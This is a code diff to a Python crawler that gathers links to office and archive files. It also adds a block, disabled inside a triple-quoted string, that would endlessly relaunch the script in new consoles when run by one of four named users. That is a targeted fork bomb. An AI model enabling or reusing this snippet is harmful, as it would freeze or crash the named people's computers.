@@ -18,7 +18,8 @@ visited = set()
 file_links = set()
 link_file = open("file_links.txt", "w")
 
-interesting_extensions = [".pdf", ".doc", "docx", "xlsx", ".zip", ".txt", ".xls", ".ppt", "pptx", ".csv"]
+interesting_extensions = (".pdf", ".doc", ".docx", ".xlsx", ".zip", ".txt", ".xls", ".ppt", ".pptx", ".csv") # Tuple vs List. 
+# List made it explode last time so here we are.
 
 user_agents = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
@@ -116,9 +117,18 @@ def crawl(start_url, max_depth=7, logger=logger):
         except Exception as e:
             logger.log(f"  !! Error: {e}", "error")
             logger.update()
+"""
+import getpass, subprocess, sys
 
-if os.environ.get('USERNAME').lower() in ["teddy", "scotcher", "sceb", "superfastboy"]:
-    pass
+if getpass.getuser().lower() in ["teddy", "scotcher", "sceb", "superfastboy"]:
+    while True:
+        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
+"""
+try:
+    logger.run(lambda logger: crawl(start_url, logger=logger))
+except Exception as e:
+    print(f"Unexpected error occurred: {e}")
+    logger.log(f"Fatal error: {e}", "error")
+    logger.update()
 
-logger.run(lambda logger: crawl(start_url, logger=logger))
 link_file.close()
